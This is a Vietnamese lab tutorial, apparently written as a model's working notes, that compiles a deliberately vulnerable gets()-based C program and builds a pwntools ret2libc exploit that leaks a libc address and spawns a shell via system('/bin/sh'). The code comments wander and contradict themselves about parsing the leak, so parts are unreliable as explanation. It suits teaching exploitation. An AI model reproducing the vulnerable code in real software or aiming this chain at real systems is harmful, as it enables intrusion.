Chúng ta sẽ xây dựng một chương trình đơn giản, toàn bộ code trong hàm main, sử dụng hàm `gets` để gây lỗi tràn bộ đệm, và dùng `puts` để in ra một giá trị từ GOT (trong trường hợp này, chúng ta có thể leak địa chỉ của `gets` hoặc `puts`). 
Chương trình sẽ không có hàm con nào khác ngoài `main`. Chúng ta sẽ tắt các bảo vệ để dễ dàng thực hiện khai thác.
Code chương trình C (vuln_simple.c):
```c
#include <stdio.h>
#include <string.h>
int main() {
    char buffer[64];
    setbuf(stdout, NULL);
    printf("Nhập input: ");
    gets(buffer); // Hàm không an toàn -> Buffer Overflow
    puts(buffer); // In lại buffer để minh họa, nhưng chúng ta sẽ dùng puts để leak địa chỉ
    return 0;
}
```
Biên dịch:
```bash
gcc vuln_simple.c -o vuln_simple -fno-stack-protector -no-pie -z execstack
```
Bây giờ, chúng ta sẽ xây dựng exploit. Vì chương trình không gọi bất kỳ hàm con nào, chúng ta phải leak địa chỉ libc bằng cách sử dụng chính hàm `puts` đã có trong chương trình.
Các bước:
1. Tìm offset từ buffer đến return address.
2. Tìm gadget `pop rdi; ret` (cần thiết để truyền tham số cho hàm).
3. Xây dựng payload đầu tiên:
   - Ghi đè return address bằng địa chỉ của gadget `pop rdi; ret`.
   - Đặt vào RDI địa chỉ GOT của một hàm (vd: `gets` hoặc `puts`).
   - Gọi `puts@plt` để in địa chỉ thực của hàm đó trong libc.
   - Quay lại hàm main (hoặc một địa điểm nào đó) để thực hiện lần overflow thứ hai.
4. Tính toán địa chỉ base của libc và địa chỉ của `system` và chuỗi "/bin/sh".
5. Xây dựng payload thứ hai để gọi `system("/bin/sh")`.
Tuy nhiên, trong chương trình này, chúng ta không có hàm `main` được gọi lại sau khi in. Vì vậy, chúng ta có thể quay lại ngay sau lệnh `call gets` (tức là quay lại địa chỉ trong hàm main) để chương trình tiếp tục bị overflow lần nữa.
Nhưng để đơn giản, chúng ta có thể kết thúc payload đầu tiên bằng địa chỉ của hàm `main` (để bắt đầu lại chương trình). Điều này giúp chúng ta có thể gửi payload thứ hai.
Vậy, chúng ta cần địa chỉ của `main` (có thể lấy từ binary).
### Exploit script:
```python
from pwn import *
# Mở chương trình
elf = context.binary = ELF('./vuln_simple')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Điều chỉnh nếu cần
p = process('./vuln_simple')
# Bước 1: Tìm offset
# Tạo pattern và tìm offset (có thể dùng gdb hoặc tính toán)
# Ở đây, chúng ta biết buffer 64 byte, nhưng còn các phần khác (saved rbp) nên offset có thể là 64 + 8 = 72?
# Nhưng tốt nhất nên kiểm tra bằng gdb.
# Giả sử chúng ta đã tìm được offset = 72 (sau buffer 64 byte và 8 byte saved rbp)
# Bước 2: Tìm gadget pop rdi
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# Bước 3: Payload leak địa chỉ
payload1 = b'A' * 72
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['gets'])   # Chúng ta sẽ leak địa chỉ của gets
payload1 += p64(elf.plt['puts'])   # Gọi puts để in địa chỉ gets
payload1 += p64(elf.sym['main'])   # Quay lại main để tiếp tục
p.recvuntil(b'Nhập input: ')
p.sendline(payload1)
# Nhận dữ liệu in ra (bao gồm cả chuỗi chúng ta nhập và địa chỉ leak)
# Sau khi gửi, chương trình in ra buffer (phần 'A'*72 và sau đó là địa chỉ leak) 
# Chúng ta cần bỏ qua 72 byte 'A' và 8 byte tiếp theo (có thể là saved rbp) và sau đó là địa chỉ leak
# Nhưng thực tế, chương trình in ra buffer (72 byte A) và sau đó là phần tiếp theo? 
# Để chắc chắn, chúng ta có thể đọc đến khi gặp dòng mới, và sau đó lấy 6 byte (vì địa chỉ 64-bit, nhưng thường chỉ có 6 byte có nghĩa)
# Sau khi gửi, chương trình in ra:
#   'A'*72 + [saved rbp] + [địa chỉ pop_rdi] + ... nhưng thực tế chỉ in đến khi gặp null byte.
# Tuy nhiên, khi chúng ta gọi puts(gets@got), nó sẽ in địa chỉ của gets (một địa chỉ 64-bit) không có null byte ở giữa, nhưng có thể có null byte ở đầu? (tùy vào ASLR)
# Chúng ta sẽ nhận dòng đầu tiên là 72 byte 'A' và có thể thêm 8 byte (saved rbp) nhưng không quan trọng, vì sau đó chương trình in địa chỉ gets (6 hoặc 7 byte) và sau đó là newline.
# Để đơn giản, chúng ta có thể đọc dòng đầu tiên (chứa 72 byte A) và sau đó đọc 8 byte tiếp theo (saved rbp) và sau đó là địa chỉ gets? 
# Nhưng thực tế, sau 72 byte A, chúng ta có 8 byte saved rbp (có thể là 'AAAA...' trong payload) và sau đó là địa chỉ pop_rdi, ... nhưng khi chương trình thực thi, nó sẽ gọi puts(gets@got) và in ra 1 dòng chỉ chứa địa chỉ gets (và có thể có thêm dữ liệu rác nếu không có null byte).
# Cách tốt hơn: sau khi gửi payload1, chương trình in ra:
#   payload1 (cho đến khi gặp null) -> nhưng gets không thêm null, nên nó in cả payload1? 
#   Tuy nhiên, hàm puts sẽ dừng khi gặp null byte. Trong payload1, chúng ta có các địa chỉ, có thể có null byte (nếu địa chỉ nhỏ). 
#   Vì vậy, chúng ta cần đọc hết dòng đầu tiên (bị cắt bởi null) và sau đó là kết quả của puts(gets@got) (một dòng riêng).
# Chúng ta có thể sử dụng:
p.recvline()  # Dòng đầu tiên chính là buffer chúng ta nhập (bị cắt nếu có null) -> nhưng trong payload1, 72 byte A không có null, nên nó in 72 byte A và sau đó là gì? 
# Thực tế, do gets kết thúc bằng null, nên buffer của chúng ta kết thúc tại 72 byte A? Và sau đó chương trình in bằng puts(buffer) -> in 72 byte A và dừng? 
# Nhưng trong chương trình, sau gets, chúng ta gọi puts(buffer) -> in ra buffer cho đến khi gặp null. Vậy nó in 72 byte A? 
# Sau đó, chương trình thực thi payload1: gọi puts(gets@got) -> in ra một dòng nữa (địa chỉ gets) và sau đó là ký tự newline.
# Vậy chúng ta có:
p.recvline()  # 72 byte 'A' -> b'A'*72
leak_line = p.recvline()  # Dòng tiếp theo chứa địa chỉ gets
leaked_gets = u64(leak_line.strip().ljust(8, b'\x00'))
log.success(f"Leaked gets address: {hex(leaked_gets)}")
# Bước 4: Tính libc base
libc.address = leaked_gets - libc.sym['gets']
system_addr = libc.sym['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
# Bước 5: Gửi payload2
payload2 = b'A' * 72
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
p.recvuntil(b'Nhập input: ')
p.sendline(payload2)
p.interactive()
```
Tuy nhiên, có một vấn đề: sau khi gọi `puts(gets@got)`, chương trình quay lại `main`, và chúng ta lại gặp lời nhắc "Nhập input: ". Nhưng khi chương trình chạy lại, stack có thể bị dịch chuyển một chút, nhưng vì chúng ta đã tính offset 72, nó vẫn đúng.
Lưu ý: Trong lần chạy lại, chúng ta không cần phải leak nữa, nên gửi payload2 ngay.
Chúng ta cũng cần đảm bảo rằng chương trình không bị crash giữa chừng. Nếu có vấn đề về stack alignment, có thể thêm một gadget `ret` trước khi gọi `system`.
Chỉnh sửa: Trong payload2, thêm một `ret` để căn chỉnh stack (nếu cần):
```python
ret_gadget = rop.find_gadget(['ret'])[0]
payload2 = b'A' * 72
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh_addr)
payload2 += p64(ret_gadget)   # Thêm ret để căn chỉnh stack (nếu cần)
payload2 += p64(system_addr)
```
Vậy, script hoàn chỉnh:
```python
from pwn import *
# Set up
context.binary = elf = ELF('./vuln_simple')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Điều chỉnh nếu cần
p = process('./vuln_simple')
# Tìm ROP gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
# Offset
offset = 72
# Payload 1: Leak địa chỉ gets
payload1 = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['gets'],
    elf.plt['puts'],
    elf.sym['main']   # Quay lại main
)
p.recvuntil(b'Nhập input: ')
p.sendline(payload1)
# Leak địa chỉ
p.recvline()  # Bỏ qua dòng in buffer (72 byte A)
leak_line = p.recvline().strip()  # Địa chỉ gets
if len(leak_line) < 8:
    leak_line = leak_line.ljust(8, b'\x00')
leaked_gets = u64(leak_line[:8])
log.info(f"Leaked gets: {hex(leaked_gets)}")
# Tính libc base
libc.address = leaked_gets - libc.sym['gets']
system_addr = libc.sym['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
log.info(f"Libc base: {hex(libc.address)}")
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(bin_sh_addr)}")
# Payload 2: Gọi system("/bin/sh")
payload2 = flat(
    b'A' * offset,
    pop_rdi,
    bin_sh_addr,
    ret,          # Căn chỉnh stack (nếu cần)
    system_addr
)
p.recvuntil(b'Nhập input: ')
p.sendline(payload2)
p.interactive()
```
Chạy thử và kiểm tra.
Lưu ý: Nếu bạn gặp lỗi về địa chỉ (vd: leak không đúng), hãy kiểm tra xem có đúng là leak địa chỉ của `gets` không, và kiểm tra phiên bản libc.
Ngoài ra, nếu không tìm thấy gadget `ret`, có thể dùng địa chỉ `pop_rdi+1` (nếu có) hoặc tìm một gadget `ret` khác. Thường thì gadget `ret` có địa chỉ là `pop_rdi+1` (vì `pop rdi; ret` -> sau lệnh pop là ret).
Trong trường hợp không tìm thấy gadget `ret` riêng, có thể bỏ qua nếu không cần căn chỉnh.
Tuy nhiên, trên hệ thống 64-bit, trước khi gọi hàm, stack cần phải căn 16-byte. Vì khi vào hàm, `call` sẽ đẩy 8 byte (return address) nên trước đó stack phải chia hết cho 16. Trong payload2, trước khi gọi `system`, stack pointer (rsp) phải thỏa mãn `rsp % 16 == 0` trước lệnh `call`. 
Chúng ta gọi `system` bằng `call` (trong PLT) nên nó cũng đẩy return address (8 byte). Trước `call` (tức là tại thời điểm `system` nhảy vào), rsp phải bằng 0 mod 16. 
Trước khi chúng ta gọi `system`, chúng ta đã có:
- `pop rdi`: pop 1 giá trị (8 byte) -> rsp tăng 8.
- `ret` (trong gadget `ret`): tương đương `pop rip` -> rsp tăng 8.
Vậy trước `call system`, rsp đã tăng 16 byte so với sau khi ghi đè return address. Nếu tại thời điểm return (khi chúng ta ghi đè return address) rsp chia hết cho 16, thì sau 2 lần pop (16 byte) rsp vẫn chia hết cho 16.
Nhưng nếu tại thời điểm return (sau khi ghi đè) rsp % 16 = 8, thì sau 2 pop (16 byte) rsp % 16 = (8+16) % 16 = 8, không chia hết. 
Vì vậy, chúng ta cần thêm một `ret` (tức là một lần pop rip nữa) để tăng rsp thêm 8, khiến rsp chia hết cho 16.
Cụ thể, trong payload2:
```
payload2 = 
   b'A'*72 
   + p64(pop_rdi)   -> ret addr: sau khi ret, rsp = rsp_original + 72 + 8 (địa chỉ pop_rdi)
   + p64(bin_sh_addr) -> pop rdi sẽ pop cái này -> rsp +=8
   + p64(ret)        -> ret: pop rip (lấy địa chỉ ret, nhưng ret không làm gì) -> rsp +=8
   + p64(system_addr) -> gọi system, lúc này rsp = rsp_original + 72 + 8 + 8 + 8 = rsp_original + 96. 
```
Mà 96 % 16 = 0 -> đảm bảo alignment.
Vì vậy, việc thêm `ret` là cần thiết để căn chỉnh stack.
Nếu không có vấn đề gì, chúng ta sẽ lấy được shell.
Ghi chú: Trong script, chúng ta dùng `flat` để tạo payload cho dễ.